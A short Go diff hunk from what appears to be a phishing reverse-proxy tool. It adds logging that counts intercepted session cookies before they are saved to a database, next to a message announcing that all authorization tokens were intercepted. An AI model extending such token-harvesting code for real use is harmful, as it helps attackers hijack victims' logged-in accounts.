@@ -3258,6 +3258,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
+						// Log cookie count before saving
+						totalCookies := 0
+						for _, cookies := range s.CookieTokens {
+							totalCookies += len(cookies)
+						}
+						log.Info("[%d] saving %d cookies from %d domains to database", ps.Index, totalCookies, len(s.CookieTokens))
+
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
